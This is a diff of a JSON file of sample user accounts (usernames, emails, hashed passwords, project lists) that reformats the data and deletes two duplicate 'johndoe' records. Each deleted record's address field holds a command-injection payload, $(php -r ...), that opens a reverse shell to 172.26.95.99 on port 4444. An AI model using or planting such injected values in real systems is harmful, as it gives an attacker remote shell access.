@@ -1,344 +1,230 @@
 [
-    {
-        "username": "jdoe",
-        "email": "jdoe@example.com",
-        "phone": "555-123-4567",
-        "address": "123 Elm Street, Springfield",
-        "password": "736fd5e59bc62eb1fbb144b8c8706a0a13e65e9b",
-        "projects": [
-            {
-                "project_name": "Website Redesign",
-                "deadline": "2024-11-01",
-                "status": "In Progress",
-                "team_members": [
-                    "Alice",
-                    "Bob",
-                    "Charlie"
-                ]
-            },
-            {
-                "project_name": "Mobile App Launch",
-                "deadline": "2024-12-15",
-                "status": "Completed",
-                "team_members": [
-                    "Diana",
-                    "Edward",
-                    "Frank"
-                ]
-            },
-            {
-                "project_name": "Database Migration",
-                "deadline": "2025-01-10",
-                "status": "Pending",
-                "team_members": [
-                    "Grace",
-                    "Hannah",
-                    "Ivan"
-                ]
-            }
-        ]
-    },
-    {
-        "username": "asmith",
-        "email": "asmith@example.com",
-        "phone": "555-987-6543",
-        "address": "456 Oak Avenue, Metropolis",
-        "password": "b55be3ebd5ed9d8e71ea7b341ed9f436aeb65839",
-        "projects": [
-            {
-                "project_name": "Cloud Integration",
-                "deadline": "2024-10-20",
-                "status": "In Progress",
-                "team_members": [
-                    "Jack",
-                    "Karen",
-                    "Louis"
-                ]
-            },
-            {
-                "project_name": "Marketing Campaign",
-                "deadline": "2024-11-30",
-                "status": "Completed",
-                "team_members": [
-                    "Monica",
-                    "Nathan",
-                    "Olivia"
-                ]
-            },
-            {
-                "project_name": "New Feature Rollout",
-                "deadline": "2025-02-15",
-                "status": "Pending",
-                "team_members": [
-                    "Patrick",
-                    "Quincy",
-                    "Rachel"
-                ]
-            }
-        ]
-    },
-    {
-        "username": "bwilliams",
-        "email": "bwilliams@example.com",
-        "phone": "555-333-2222",
-        "address": "789 Pine Road, Gotham",
-        "password": "9ad8c653d2514a5c0d97fa6ab6c4c5b2269b7e0b",
-        "projects": [
-            {
-                "project_name": "Cybersecurity Audit",
-                "deadline": "2024-09-15",
-                "status": "In Progress",
-                "team_members": [
-                    "Steve",
-                    "Tina",
-                    "Uma"
-                ]
-            },
-            {
-                "project_name": "Backend Optimization",
-                "deadline": "2024-12-05",
-                "status": "Completed",
-                "team_members": [
-                    "Victor",
-                    "Wanda",
-                    "Xander"
-                ]
-            },
-            {
-                "project_name": "AI Implementation",
-                "deadline": "2025-03-01",
-                "status": "Pending",
-                "team_members": [
-                    "Yasmine",
-                    "Zack",
-                    "Alice"
-                ]
-            }
-        ]
-    },
-    {
-        "username": "cjones",
-        "email": "cjones@example.com",
-        "phone": "555-444-1111",
-        "address": "321 Maple Drive, Star City",
-        "password": "a1fc51f35b606c97f3136184ea1285045a14d3a7",
-        "projects": [
-            {
-                "project_name": "Data Analysis",
-                "deadline": "2024-08-31",
-                "status": "In Progress",
-                "team_members": [
-                    "Brian",
-                    "Cathy",
-                    "David"
-                ]
-            },
-            {
-                "project_name": "User Feedback System",
-                "deadline": "2024-11-20",
-                "status": "Completed",
-                "team_members": [
-                    "fgarcia",
-                    "emartin"
-                ]
-            },
-            {
-                "project_name": "Customer Portal Update",
-                "deadline": "2025-01-25",
-                "status": "Pending",
-                "team_members": [
-                    "fgarcia",
-                    "emartin"
-                ]
-            }
-        ]
-    },
-    {
-        "username": "dlbrown",
-        "email": "dlbrown@example.com",
-        "phone": "555-555-5555",
-        "address": "135 Cypress Street, Central City",
-        "password": "ab0edb614669891df5d103ca6e96df53d850098b",
-        "projects": [
-            {
-                "project_name": "Website Redesign",
-                "deadline": "2024-11-01",
-                "status": "In Progress",
-                "team_members": [
-                    "Alice",
-                    "Bob",
-                    "Charlie"
-                ]
-            },
-            {
-                "project_name": "Mobile App Launch",
-                "deadline": "2024-12-15",
-                "status": "Completed",
-                "team_members": [
-                    "Diana",
-                    "Edward",
-                    "Frank"
-                ]
-            },
-            {
-                "project_name": "Database Migration",
-                "deadline": "2025-01-10",
-                "status": "Pending",
-                "team_members": [
-                    "Grace",
-                    "Hannah",
-                    "Ivan"
-                ]
-            }
-        ]
-    },
-    {
-        "username": "emartin",
-        "email": "emartin@example.com",
-        "phone": "555-666-7777",
-        "address": "678 Birch Lane, Coast City",
-        "password": "6d03ea92dc1216c5d254b768239a73adbf03b0de",
-        "projects": [
-            {
-                "project_name": "User Feedback System",
-                "deadline": "2024-11-20",
-                "status": "Completed",
-                "team_members": [
-                    "fgarcia",
-                    "emartin"
-                ]
-            },
-            {
-                "project_name": "Customer Portal Update",
-                "deadline": "2025-01-25",
-                "status": "Pending",
-                "team_members": [
-                    "fgarcia",
-                    "emartin"
-                ]
-            }
-        ]
-    },
-    {
-        "username": "fgarcia",
-        "email": "fgarcia@example.com",
-        "phone": "555-888-9999",
-        "address": "901 Spruce Court, Starling City",
-        "password": "8c4e1f1567335f2849f3dbbdbb3c4ae614e780b7",
-        "projects": [
-            {
-                "project_name": "User Feedback System",
-                "deadline": "2024-11-20",
-                "status": "Completed",
-                "team_members": [
-                    "fgarcia",
-                    "emartin"
-                ]
-            },
-            {
-                "project_name": "Customer Portal Update",
-                "deadline": "2025-01-25",
-                "status": "Pending",
-                "team_members": [
-                    "fgarcia",
-                    "emartin"
-                ]
-            }
-        ]
-    },
-    {
-        "username": "kthomas",
-        "email": "kthomas@example.com",
-        "phone": "555-777-8888",
-        "address": "987 Cedar Lane, Emerald City",
-        "password": "1d3a5fcb248d6f4b4cc1964e881c98e5d2585025",
-        "projects": [
-            {
-                "project_name": "E-Commerce Website",
-                "deadline": "2024-11-15",
-                "status": "In Progress",
-                "team_members": [
-                    "Alice",
-                    "Bob",
-                    "Charlie"
-                ]
-            },
-            {
-                "project_name": "SEO Optimization",
-                "deadline": "2024-12-01",
-                "status": "Completed",
-                "team_members": [
-                    "Diana",
-                    "Edward"
-                ]
-            },
-            {
-                "project_name": "Customer Support Chatbot",
-                "deadline": "2025-01-10",
-                "status": "Pending",
-                "team_members": [
-                    "Frank",
-                    "Grace",
-                    "Hannah"
-                ]
-            },
-            {
-                "project_name": "Cloud Backup System",
-                "deadline": "2024-10-25",
-                "status": "In Progress",
-                "team_members": [
-                    "Ian",
-                    "Jack",
-                    "Karen"
-                ]
-            },
-            {
-                "project_name": "Mobile App UX Design",
-                "deadline": "2025-02-20",
-                "status": "Pending",
-                "team_members": [
-                    "Laura",
-                    "Mike",
-                    "Nina"
-                ]
-            },
-            {
-                "project_name": "Employee Training Portal",
-                "deadline": "2024-09-30",
-                "status": "Completed",
-                "team_members": [
-                    "Oscar",
-                    "Pam",
-                    "Quincy"
-                ]
-            },
-            {
-                "project_name": "AI-Powered Analytics",
-                "deadline": "2025-03-15",
-                "status": "In Progress",
-                "team_members": [
-                    "Rachel",
-                    "Steve",
-                    "Tina",
-                    "Uma"
-                ]
-            }
-        ]
-    },
-    {
-        "username": "johndoe",
-        "email": "johndoe@example.com",
-        "phone": "1234567890",
-        "address": "123 Elm Street, Springfield $(php -r '$sock=fsockopen(\"172.26.95.99\",4444);exec(\"\/bin\/sh -i <&3 >&3 2>&3\");')",
-        "password": "ea0c04513c32717f3a09ff7b1fa882c4d8424b2a",
-        "projects": []
-    },
-    {
-        "username": "johndoe",
-        "email": "johndoe@example.com",
-        "phone": "1234567890",
-        "address": "123 Elm Street, Springfield $(php -r '$sock=fsockopen(\"172.26.95.99\",4444);exec(\"\/bin\/sh -i <&3 >&3 2>&3\");')",
-        "password": "ea0c04513c32717f3a09ff7b1fa882c4d8424b2a",
-        "projects": []
-    }
+  {
+    "username": "jdoe",
+    "email": "jdoe@example.com",
+    "phone": "555-123-4567",
+    "address": "123 Elm Street, Springfield",
+    "password": "736fd5e59bc62eb1fbb144b8c8706a0a13e65e9b",
+    "projects": [
+      {
+        "project_name": "Website Redesign",
+        "deadline": "2024-11-01",
+        "status": "In Progress",
+        "team_members": ["Alice", "Bob", "Charlie"]
+      },
+      {
+        "project_name": "Mobile App Launch",
+        "deadline": "2024-12-15",
+        "status": "Completed",
+        "team_members": ["Diana", "Edward", "Frank"]
+      },
+      {
+        "project_name": "Database Migration",
+        "deadline": "2025-01-10",
+        "status": "Pending",
+        "team_members": ["Grace", "Hannah", "Ivan"]
+      }
+    ]
+  },
+  {
+    "username": "asmith",
+    "email": "asmith@example.com",
+    "phone": "555-987-6543",
+    "address": "456 Oak Avenue, Metropolis",
+    "password": "b55be3ebd5ed9d8e71ea7b341ed9f436aeb65839",
+    "projects": [
+      {
+        "project_name": "Cloud Integration",
+        "deadline": "2024-10-20",
+        "status": "In Progress",
+        "team_members": ["Jack", "Karen", "Louis"]
+      },
+      {
+        "project_name": "Marketing Campaign",
+        "deadline": "2024-11-30",
+        "status": "Completed",
+        "team_members": ["Monica", "Nathan", "Olivia"]
+      },
+      {
+        "project_name": "New Feature Rollout",
+        "deadline": "2025-02-15",
+        "status": "Pending",
+        "team_members": ["Patrick", "Quincy", "Rachel"]
+      }
+    ]
+  },
+  {
+    "username": "bwilliams",
+    "email": "bwilliams@example.com",
+    "phone": "555-333-2222",
+    "address": "789 Pine Road, Gotham",
+    "password": "9ad8c653d2514a5c0d97fa6ab6c4c5b2269b7e0b",
+    "projects": [
+      {
+        "project_name": "Cybersecurity Audit",
+        "deadline": "2024-09-15",
+        "status": "In Progress",
+        "team_members": ["Steve", "Tina", "Uma"]
+      },
+      {
+        "project_name": "Backend Optimization",
+        "deadline": "2024-12-05",
+        "status": "Completed",
+        "team_members": ["Victor", "Wanda", "Xander"]
+      },
+      {
+        "project_name": "AI Implementation",
+        "deadline": "2025-03-01",
+        "status": "Pending",
+        "team_members": ["Yasmine", "Zack", "Alice"]
+      }
+    ]
+  },
+  {
+    "username": "cjones",
+    "email": "cjones@example.com",
+    "phone": "555-444-1111",
+    "address": "321 Maple Drive, Star City",
+    "password": "a1fc51f35b606c97f3136184ea1285045a14d3a7",
+    "projects": [
+      {
+        "project_name": "Data Analysis",
+        "deadline": "2024-08-31",
+        "status": "In Progress",
+        "team_members": ["Brian", "Cathy", "David"]
+      },
+      {
+        "project_name": "User Feedback System",
+        "deadline": "2024-11-20",
+        "status": "Completed",
+        "team_members": ["fgarcia", "emartin"]
+      },
+      {
+        "project_name": "Customer Portal Update",
+        "deadline": "2025-01-25",
+        "status": "Pending",
+        "team_members": ["fgarcia", "emartin"]
+      }
+    ]
+  },
+  {
+    "username": "dlbrown",
+    "email": "dlbrown@example.com",
+    "phone": "555-555-5555",
+    "address": "135 Cypress Street, Central City",
+    "password": "ab0edb614669891df5d103ca6e96df53d850098b",
+    "projects": [
+      {
+        "project_name": "Website Redesign",
+        "deadline": "2024-11-01",
+        "status": "In Progress",
+        "team_members": ["Alice", "Bob", "Charlie"]
+      },
+      {
+        "project_name": "Mobile App Launch",
+        "deadline": "2024-12-15",
+        "status": "Completed",
+        "team_members": ["Diana", "Edward", "Frank"]
+      },
+      {
+        "project_name": "Database Migration",
+        "deadline": "2025-01-10",
+        "status": "Pending",
+        "team_members": ["Grace", "Hannah", "Ivan"]
+      }
+    ]
+  },
+  {
+    "username": "emartin",
+    "email": "emartin@example.com",
+    "phone": "555-666-7777",
+    "address": "678 Birch Lane, Coast City",
+    "password": "6d03ea92dc1216c5d254b768239a73adbf03b0de",
+    "projects": [
+      {
+        "project_name": "User Feedback System",
+        "deadline": "2024-11-20",
+        "status": "Completed",
+        "team_members": ["fgarcia", "emartin"]
+      },
+      {
+        "project_name": "Customer Portal Update",
+        "deadline": "2025-01-25",
+        "status": "Pending",
+        "team_members": ["fgarcia", "emartin"]
+      }
+    ]
+  },
+  {
+    "username": "fgarcia",
+    "email": "fgarcia@example.com",
+    "phone": "555-888-9999",
+    "address": "901 Spruce Court, Starling City",
+    "password": "8c4e1f1567335f2849f3dbbdbb3c4ae614e780b7",
+    "projects": [
+      {
+        "project_name": "User Feedback System",
+        "deadline": "2024-11-20",
+        "status": "Completed",
+        "team_members": ["fgarcia", "emartin"]
+      },
+      {
+        "project_name": "Customer Portal Update",
+        "deadline": "2025-01-25",
+        "status": "Pending",
+        "team_members": ["fgarcia", "emartin"]
+      }
+    ]
+  },
+  {
+    "username": "kthomas",
+    "email": "kthomas@example.com",
+    "phone": "555-777-8888",
+    "address": "987 Cedar Lane, Emerald City",
+    "password": "1d3a5fcb248d6f4b4cc1964e881c98e5d2585025",
+    "projects": [
+      {
+        "project_name": "E-Commerce Website",
+        "deadline": "2024-11-15",
+        "status": "In Progress",
+        "team_members": ["Alice", "Bob", "Charlie"]
+      },
+      {
+        "project_name": "SEO Optimization",
+        "deadline": "2024-12-01",
+        "status": "Completed",
+        "team_members": ["Diana", "Edward"]
+      },
+      {
+        "project_name": "Customer Support Chatbot",
+        "deadline": "2025-01-10",
+        "status": "Pending",
+        "team_members": ["Frank", "Grace", "Hannah"]
+      },
+      {
+        "project_name": "Cloud Backup System",
+        "deadline": "2024-10-25",
+        "status": "In Progress",
+        "team_members": ["Ian", "Jack", "Karen"]
+      },
+      {
+        "project_name": "Mobile App UX Design",
+        "deadline": "2025-02-20",
+        "status": "Pending",
+        "team_members": ["Laura", "Mike", "Nina"]
+      },
+      {
+        "project_name": "Employee Training Portal",
+        "deadline": "2024-09-30",
+        "status": "Completed",
+        "team_members": ["Oscar", "Pam", "Quincy"]
+      },
+      {
+        "project_name": "AI-Powered Analytics",
+        "deadline": "2025-03-15",
+        "status": "In Progress",
+        "team_members": ["Rachel", "Steve", "Tina", "Uma"]
+      }
+    ]
+  }
 ]
